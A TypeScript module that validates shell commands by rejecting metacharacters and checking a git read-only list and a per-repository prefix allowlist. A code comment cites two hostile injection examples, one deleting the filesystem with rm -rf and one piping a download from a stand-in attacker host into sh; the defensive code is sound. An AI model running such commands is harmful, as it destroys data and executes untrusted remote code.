import { GLOBAL_ALLOWED_COMMANDS } from '../config/commands.js';

export class CommandBlockedError extends Error {
  constructor(command: string, reason: string) {
    super(`Command blocked: "${command}" -- ${reason}`);
    this.name = 'CommandBlockedError';
  }
}

// Characters that enable shell chaining, substitution, or redirection.
// A command containing any of these is rejected before allowlist checks,
// making startsWith-based allowlist matching safe against injection like
// `npm test && rm -rf /` or `npm test; curl evil.com | sh`.
const SHELL_METACHAR = /[;&|`$(){}<>\\\n\r]/;

export function validateCommand(command: string, repoAllowedCommands: string[]): void {
  const trimmed = command.trim();

  // Reject shell metacharacters unconditionally — no allowlist entry can override this.
  if (SHELL_METACHAR.test(trimmed)) {
    throw new CommandBlockedError(trimmed, 'contains shell metacharacters');
  }

  // Check global git read-only commands.
  for (const pattern of GLOBAL_ALLOWED_COMMANDS) {
    if (pattern.test(trimmed)) return;
  }

  // Check repo-specific allowlist.
  // `allowed` is a prefix: exact match or followed by a space (flags/args).
  for (const allowed of repoAllowedCommands) {
    if (trimmed === allowed || trimmed.startsWith(allowed + ' ')) return;
  }

  throw new CommandBlockedError(trimmed, 'not on allowlist');
}
